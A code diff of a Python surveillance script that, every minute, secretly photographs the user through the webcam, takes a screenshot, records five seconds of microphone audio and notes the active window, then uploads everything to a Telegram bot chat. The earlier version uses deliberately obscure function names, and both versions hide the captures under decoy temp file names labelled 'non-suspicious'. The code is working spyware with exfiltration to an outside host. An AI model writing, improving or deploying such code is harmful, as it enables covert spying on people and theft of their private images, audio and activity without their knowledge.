@@ -20,113 +20,128 @@ load_dotenv()
 # Configuration
 TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
-T_01 = os.getenv("TOPIC_WEBCAM")
-T_02 = os.getenv("TOPIC_SCREENSHOT")
-T_03 = os.getenv("TOPIC_AUDIO")
-T_GEN = os.getenv("TOPIC_GENERAL")
+TOPIC_WEBCAM = os.getenv("TOPIC_WEBCAM")
+TOPIC_SCREENSHOT = os.getenv("TOPIC_SCREENSHOT")
+TOPIC_AUDIO = os.getenv("TOPIC_AUDIO")
+TOPIC_GENERAL = os.getenv("TOPIC_GENERAL")
 
-SYNC_VAL = 60  
-A_LEN = 5  
-S_RATE = 44100
+INTERVAL = 60  # seconds between captures
+AUDIO_DURATION = 5  # seconds
+SAMPLE_RATE = 44100
 
-def get_p_path(f_name):
-    return os.path.join(tempfile.gettempdir(), f_name)
+def get_temp_path(filename):
+    return os.path.join(tempfile.gettempdir(), filename)
 
-def get_ctx():
+def get_active_window():
     if gw:
         try:
-            w = gw.getActiveWindow()
-            return w.title if w else "IDLE"
+            window = gw.getActiveWindow()
+            return window.title if window else "Unknown"
         except Exception:
-            return "ERR"
-    return "N/A"
+            return "Error retrieving window"
+    return "Non-Windows Environment"
 
-def proc_01(f):
-    c = cv2.VideoCapture(0)
-    if not c.isOpened():
+def capture_webcam(filename):
+    cam = cv2.VideoCapture(0)
+    if not cam.isOpened():
         return False
+    
+    # Allow camera to warm up
     time.sleep(0.5)
-    r, fr = c.read()
-    if r:
-        cv2.imwrite(f, fr)
-    c.release()
-    return r
+    ret, frame = cam.read()
+    if ret:
+        cv2.imwrite(filename, frame)
+    
+    cam.release()
+    return ret
 
-def proc_02(f):
+def capture_screenshot(filename):
     try:
-        s = ImageGrab.grab()
-        s.save(f)
+        screenshot = ImageGrab.grab()
+        screenshot.save(filename)
         return True
     except Exception:
         return False
 
-def proc_03(f):
+def capture_audio(filename):
     try:
-        rec = sd.rec(int(A_LEN * S_RATE), samplerate=S_RATE, channels=1)
+        recording = sd.rec(int(AUDIO_DURATION * SAMPLE_RATE), samplerate=SAMPLE_RATE, channels=1)
         sd.wait()
-        wavfile.write(f, S_RATE, rec)
+        wavfile.write(filename, SAMPLE_RATE, recording)
         return True
     except Exception:
         return False
 
-def sync_data(ctx, f1, f2, f3):
-    u_p = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
-    u_d = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+def send_to_telegram(window_title, webcam_file, screen_file, audio_file):
+    url_photo = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
+    url_doc = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
     
-    msg = f"CTX: {ctx}"
+    caption = f"Context: {window_title}"
     
-    def push(u, t, tid, cap, fls):
-        p = {"chat_id": CHAT_ID, "caption": cap}
-        if tid:
-            p["message_thread_id"] = tid
+    def post_data(url, data_type, topic_id, extra_data, files):
+        payload = {
+            "chat_id": CHAT_ID,
+            "caption": extra_data
+        }
+        if topic_id:
+            payload["message_thread_id"] = topic_id
+            
         try:
-            r = requests.post(u, data=p, files=fls)
-            res = r.json()
-            if not res.get("ok") and tid == "1":
-                del p["message_thread_id"]
-                requests.post(u, data=p, files=fls)
+            resp = requests.post(url, data=payload, files=files)
+            result = resp.json()
+            if not result.get("ok"):
+                # Fallback for General topic if thread ID 1 is rejected
+                if topic_id == "1":
+                    del payload["message_thread_id"]
+                    requests.post(url, data=payload, files=files)
         except Exception:
             pass
 
-    if os.path.exists(f2):
-        with open(f2, "rb") as f:
-            push(u_p, "p", T_02, f"LOG_S\n{msg}", {"photo": f})
+    # Send Screenshot to TOPIC_SCREENSHOT
+    if os.path.exists(screen_file):
+        with open(screen_file, "rb") as f:
+            post_data(url_photo, "photo", TOPIC_SCREENSHOT, f"LOG_S\n{caption}", {"photo": f})
             
-    if os.path.exists(f1):
-        with open(f1, "rb") as f:
-            push(u_p, "p", T_01, f"LOG_W\n{msg}", {"photo": f})
+    # Send Webcam to TOPIC_WEBCAM
+    if os.path.exists(webcam_file):
+        with open(webcam_file, "rb") as f:
+            post_data(url_photo, "photo", TOPIC_WEBCAM, f"LOG_W\n{caption}", {"photo": f})
 
-    if os.path.exists(f3):
-        with open(f3, "rb") as f:
-            push(u_d, "d", T_03, f"LOG_A\n{msg}", {"document": f})
+    # Send Audio to TOPIC_AUDIO
+    if os.path.exists(audio_file):
+        with open(audio_file, "rb") as f:
+            post_data(url_doc, "document", TOPIC_AUDIO, f"LOG_A\n{caption}", {"document": f})
 
 def main():
     if not TOKEN or not CHAT_ID:
         return
 
-    # Generic system paths
-    p1 = get_p_path("idx_01.tmp")
-    p2 = get_p_path("idx_02.tmp")
-    p3 = get_p_path("idx_03.tmp")
+    # Non-suspicious temporary file names
+    webcam_file = get_temp_path("idx_01.tmp")
+    screen_file = get_temp_path("idx_02.tmp")
+    audio_file = get_temp_path("idx_03.tmp")
 
     try:
         while True:
-            ctx = get_ctx()
+            window_title = get_active_window()
             
-            proc_01(p1)
-            proc_02(p2)
-            proc_03(p3)
+            # Capture all data points
+            capture_webcam(webcam_file)
+            capture_screenshot(screen_file)
+            capture_audio(audio_file)
             
-            sync_data(ctx, p1, p2, p3)
+            # Send to Telegram
+            send_to_telegram(window_title, webcam_file, screen_file, audio_file)
             
-            for p in [p1, p2, p3]:
-                if os.path.exists(p):
+            # Cleanup temp files
+            for f in [webcam_file, screen_file, audio_file]:
+                if os.path.exists(f):
                     try:
-                        os.remove(p)
+                        os.remove(f)
                     except Exception:
                         pass
             
-            time.sleep(SYNC_VAL)
+            time.sleep(INTERVAL)
             
     except KeyboardInterrupt:
         pass
